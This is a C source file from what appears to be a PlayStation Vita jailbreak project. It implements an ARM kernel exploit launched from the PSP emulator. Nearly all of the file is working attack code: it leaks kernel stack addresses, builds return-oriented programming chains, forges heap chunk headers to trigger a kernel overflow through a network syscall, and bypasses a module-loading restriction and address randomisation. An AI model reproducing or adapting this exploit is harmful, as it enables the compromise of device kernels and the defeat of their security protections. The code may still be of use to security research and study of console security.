/* arm.c -- implementation of the arm kernel exploit
 *
 * Copyright (C) 2019 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

#include <pspsdk.h>
#include <pspkernel.h>

#include <stdio.h>
#include <string.h>

#include "main.h"
#include "arm.h"
#include "krop.h"
#include "rpc.h"
#include "rop.h"
#include "gadgets.h"

#include "library/pspemu.h"
#include "library/libkernel.h"
#include "library/driveruser.h"
#include "library/net.h"
#include "library/safemode.h"

#define MAGIC_BUSY 0x42755379
#define MAGIC_FREE 0x46724565
#define MAGIC_MAAK 0x4d61416b

typedef struct chunk_header {
  uint32_t magic;
  uint32_t free_lr;
  uint32_t malloc_lr;
  uint32_t footer;
  struct chunk_header *next;
  struct chunk_header *prev;
  uint32_t size;
  uint32_t pad;
} chunk_header_t;

typedef struct chunk_footer {
  uint32_t magic;
  uint32_t pad;
} chunk_footer_t;

static char overflow[0x1000];
static char krop[0x400];
static char kstack1[0x40], kstack2[0x40];

static SceUID semaid1, semaid2;

static u32 pspemu_base, libkernel_base, driveruser_base, net_base, safemode_base;
static u32 sysmem_base, kstack_base, wlanbt_vptr;

int trigger_exploit = 0;

static u16 decode_mov(u32 *addr) {
  return ((*addr & 0xf0000) >> 4) | (*addr & 0xfff);
}

static u32 decode_movw_movt(u32 *addr) {
  return decode_mov(addr) | (decode_mov(addr + 1) << 16);
}

static u32 get_module_base(const char *name) {
  SceUID modids[128];
  int num = 128;

  if (call(libkernel_base + SceLibKernel_sceKernelGetModuleList, 0xff, NATIVE(modids), NATIVE(&num)) < 0)
    return 0;

  int i;
  for (i = 0; i < num; i++) {
    SceKernelModuleInfoNative info;
    memset(&info, 0, sizeof(info));
    info.size = sizeof(info);
    if (call(libkernel_base + SceLibKernel_sceKernelGetModuleInfo, modids[i], NATIVE(&info)) >= 0) {
      if (strcmp(info.module_name, name) == 0) {
        return (u32)info.segments[0].vaddr;
      }
    }
  }

  return 0;
}

static int get_interface(const char *name) {
  u32 iflist[10][80];
  int num = call(net_base + SceNet_sceNetSyscallGetIfList, NATIVE(iflist), 10);
  if (num < 0)
    return num;

  int i;
  for (i = 0; i < num; i++) {
    if (strcmp((char *)iflist[i], name) == 0) {
      return iflist[i][8];
    }
  }

  return -1;
}

static void build_overflow_buffer(void) {
  chunk_footer_t footer;
  footer.magic = MAGIC_MAAK;
  footer.pad = 0;

  chunk_header_t first;
  first.magic = MAGIC_BUSY;
  first.free_lr = 0;
  first.malloc_lr = 0;
  first.footer = 0;
  first.next = (void *)(wlanbt_vptr - offsetof(chunk_header_t, prev));
  first.prev = (void *)(wlanbt_vptr - offsetof(chunk_header_t, next));
  first.size = sizeof(footer);
  first.pad = 0;

  chunk_header_t second;
  second.magic = MAGIC_FREE;
  second.free_lr = 0;
  second.malloc_lr = 0;
  second.footer = 0;
  second.next = (void *)(wlanbt_vptr - offsetof(chunk_header_t, prev));
  second.prev = (void *)(wlanbt_vptr - offsetof(chunk_header_t, next));
  second.size = sizeof(overflow) - sizeof(second);
  second.pad = 0;

  char *buf = overflow + 0x10 - 0x28;
  u32 offset = 0x800;

  memset(overflow, 0, sizeof(overflow));

  memcpy(buf + offset, &footer, sizeof(footer));
  offset += sizeof(footer);
  memcpy(buf + offset, &first, sizeof(first));
  offset += sizeof(first);
  memcpy(buf + offset, &footer, sizeof(footer));
  offset += sizeof(footer);
  memcpy(buf + offset, &second, sizeof(second));
  offset += sizeof(second);

  // Overflow size
  *(u32 *)(overflow + 0xc) = offset - 0x28;

  // Kick off
  *(u32 *)(buf - 0x20 + 0x630) = 0xDEADBEEF;                                    // r4 <-- r0 will point here
  *(u32 *)(buf - 0x20 + 0x634) = 0xDEADBEEF;                                    // sl
  *(u32 *)(buf - 0x20 + 0x638) = sysmem_base + SceSysmem_ldm_r0_r4_sl_ip_sp_pc; // ip <-- this will be executed
  *(u32 *)(buf - 0x20 + 0x63c) = kstack_base + 0xa30;                           // sp
  *(u32 *)(buf - 0x20 + 0x640) = sysmem_base + SceSysmem_pop_pc;                // pc
}

static int build_exploit_rop(void *buf, int size) {
  static char dummy[0x114];

  u32 mov;
  read_native(&mov, safemode_base + SceSafeMode_sceUdcdWaitState, sizeof(mov));
  int sceUdcdGetDeviceInfo_syscall = decode_mov(&mov) + 1;

  int intf = get_interface("wlan0");

  begin_rop(buf, size);

  // Leak kernel stack
  push_call(pspemu_base + ScePspemu_sceWlanGetConfiguration, NULL);
  push_syscall(sceUdcdGetDeviceInfo_syscall, NATIVE(kstack1));
  push_call(driveruser_base + SceDriverUser_sceRtcConvertLocalTimeToUtc, NULL, NULL);
  push_syscall(sceUdcdGetDeviceInfo_syscall, NATIVE(kstack2));

  // Notify that kernel stack is ready
  push_call(pspemu_base + ScePspemu_sceKernelSignalSema, semaid1, 1);

  // Wait for kernel rop chain and overflow buffer
  push_call(pspemu_base + ScePspemu_sceKernelWaitSema, semaid2, 1, NULL);

  // Plant kernel rop chain into kernel stack
  push_call(driveruser_base + SceDriverUser_sceAppMgrPspSaveDataGetParams, NATIVE(krop));

  // Abuse a bug in this command to occupy all memory slots
  memset(dummy, 0, sizeof(dummy));

  int i;
  for (i = 0; i < 8; i++)
    push_call(net_base + SceNet_sceNetSyscallControl, intf, 0x50120003, NATIVE(dummy), sizeof(dummy));

  // Trigger overflow
  push_call(net_base + SceNet_sceNetSyscallControl, intf, 0x50120004, NATIVE(overflow), sizeof(overflow));

  // Execute kernel rop chain
  push_call(net_base + SceNet_sceNetSyscallControl, intf, 0x50120004, NATIVE(&dummy), 0);

  // Exit and delete thread
  push_call(libkernel_base + SceLibKernel_sceKernelExitDeleteThread, -1);

  return end_rop();
}

static int build_load_rop(void *buf, int size) {
  begin_rop(buf, size);

  // Bypass sceKernelInhibitLoadingModule() by using flags 0x10
  push_call(libkernel_base + SceLibKernel_sceKernelLoadStartModule,
            NATIVE("os0:ue/safemode.self"), 0, NULL, 0x10, NULL, NULL);

  // Exit and delete thread
  push_call(libkernel_base + SceLibKernel_sceKernelExitDeleteThread, 0);

  return end_rop();
}

static int load_safe_mode(void) {
  // Load and start SceSafeMode in a separate thread
  SceUID thid = call(libkernel_base + SceLibKernel_sceKernelCreateThread, NATIVE(""),
                     libkernel_base + SceLibKernel_pop_pc, 0x40, 0x4000, 0, 0x10000, NULL);
  if (thid < 0)
    return thid;

  u32 rop[64];
  int rop_size = build_load_rop(rop, sizeof(rop));
  call(libkernel_base + SceLibKernel_sceKernelStartThread, thid, rop_size, NATIVE(rop));

  // Wait until SceSafeMode has drawn its screen, then restore old framebuf
  SceDisplayFrameBuf old_framebuf;
  memset(&old_framebuf, 0, sizeof(old_framebuf));
  old_framebuf.size = sizeof(old_framebuf);
  call(driveruser_base + SceDriverUser_sceDisplayGetFrameBuf, NATIVE(&old_framebuf), 1);

  while (1) {
    SceDisplayFrameBuf framebuf;
    memset(&framebuf, 0, sizeof(framebuf));
    framebuf.size = sizeof(framebuf);
    call(driveruser_base + SceDriverUser_sceDisplayGetFrameBuf, NATIVE(&framebuf), 1);

    if (framebuf.base != old_framebuf.base) {
      call(driveruser_base + SceDriverUser_sceDisplaySetFrameBuf, NATIVE(&old_framebuf), 1);
      break;
    }

    call(pspemu_base + ScePspemu_sceDisplayWaitVblankStart);
  }

  safemode_base = get_module_base("SceSafeMode");

  return 0;
}

int exploit_arm_kernel(void) {
  int res;

  res = load_safe_mode();
  if (res < 0)
    return res;

  // Wait for animation to end
  while (!trigger_exploit)
    sceKernelDelayThread(1 * 1000 * 1000);

  semaid1 = call(pspemu_base + ScePspemu_sceKernelCreateSema, NATIVE(""), 0, 0, 1, NULL);
  if (semaid1 < 0)
    return semaid1;

  semaid2 = call(pspemu_base + ScePspemu_sceKernelCreateSema, NATIVE(""), 0, 0, 1, NULL);
  if (semaid2 < 0)
    return semaid2;

  // Create high priority thread for exploit
  SceUID thid = call(libkernel_base + SceLibKernel_sceKernelCreateThread, NATIVE(""),
                     libkernel_base + SceLibKernel_pop_pc, 0x40, 0x4000, 0, 0x10000, NULL);
  if (thid < 0)
    return thid;

  u32 rop[512];
  int rop_size = build_exploit_rop(rop, sizeof(rop));
  call(libkernel_base + SceLibKernel_sceKernelStartThread, thid, rop_size, NATIVE(rop));

  // Wait for kernel stack leak
  call(pspemu_base + ScePspemu_sceKernelWaitSema, semaid1, 1, NULL);

  wlanbt_vptr = *(u32 *)(kstack1 + 0x10) + 0x580;
  kstack_base = *(u32 *)(kstack2 + 0x18) - 0xf80;
  sysmem_base = *(u32 *)(kstack2 + 0x20) - 0x29f2c;

  build_krop(krop, sizeof(krop), sysmem_base, kstack_base);
  build_overflow_buffer();

  // Notify that kernel rop chain and overflow buffer are ready
  call(pspemu_base + ScePspemu_sceKernelSignalSema, semaid2, 1);

  // Wait for thread to end (we should have executed the kernel payload by the time this wakes up)
  int status = 0;
  call(libkernel_base + SceLibKernel_sceKernelWaitThreadEnd, thid, NATIVE(&status), NULL);

  call(pspemu_base + ScePspemu_sceKernelDeleteSema, semaid2);
  call(pspemu_base + ScePspemu_sceKernelDeleteSema, semaid1);

  return status;
}

int exploit_arm_userland(void) {
  u32 pspemu_data, libkernel_data;
  u32 stack_cookie, stack_pointer;
  u32 mov[2];

  // ScePspemu data address is always at 0x81100X00 or 0x81200X00

  pspemu_data = 0;

  int i;
  for (i = 0x81200000; i >= 0x81100000; i -= 0x100000) {
    int j;
    for (j = 0x1000; j >= 0; j -= 0x100) {
      u32 data;
      read_native(&data, i + j + 0x80, sizeof(data));
      if (data == 0xe59ff208) {
        pspemu_data = i + j;
        break;
      }
    }

    if (pspemu_data)
      break;
  }

  if (!pspemu_data)
    return -1;

  read_native(&pspemu_base, pspemu_data, sizeof(pspemu_base));
  pspemu_base -= 0xa5;

  read_native(mov, pspemu_base + ScePspemu_sceKernelWaitSema, sizeof(mov));
  libkernel_base = decode_movw_movt(mov) - SceLibKernel_sceKernelWaitSema;

  read_native(&libkernel_data, libkernel_base + 0xc214, sizeof(libkernel_data));
  libkernel_data -= 0x14;

  read_native(mov, pspemu_base + ScePspemu_sceRtcGetCurrentClockLocalTime, sizeof(mov));
  driveruser_base = decode_movw_movt(mov) - SceDriverUser_sceRtcGetCurrentClockLocalTime;

  read_native(mov, pspemu_base + ScePspemu_sceNetRecv, sizeof(mov));
  net_base = decode_movw_movt(mov) - SceNet_sceNetRecv;

  read_native(&stack_cookie, libkernel_data + 0x14, sizeof(stack_cookie));

  stack_pointer = init_rpc(stack_cookie, pspemu_base, libkernel_base);

  call(pspemu_base + ScePspemu_sceNetTerm);

  return 0;
}
